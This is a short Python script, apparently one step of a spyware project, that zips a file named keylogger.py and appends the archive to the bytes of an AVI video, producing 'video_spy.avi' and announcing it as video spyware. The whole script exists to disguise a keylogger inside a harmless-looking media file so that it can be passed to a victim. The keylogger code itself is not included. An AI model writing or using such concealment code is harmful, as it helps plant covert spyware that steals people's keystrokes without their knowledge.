import os
from zipfile import ZipFile 

# Creating zip file of keylogger
with ZipFile("zipped_key.zip", "w") as newzip:
	newzip.write("keylogger.py")

# Reading data from video 
with open('video_made1.avi', 'rb') as fp: 
    data = fp.read()
      
# Reading data from zipped keylogger 
with open('zipped_key.zip','rb') as fp: 
    data2 = fp.read() 

# Hiding zipped keylogger within video  
with open ('video_spy.avi', 'wb') as fp: 
    fp.write(data)
    fp.write(data2)
# It will be used in the next task
print("Created video spyware as : video_spy.avi")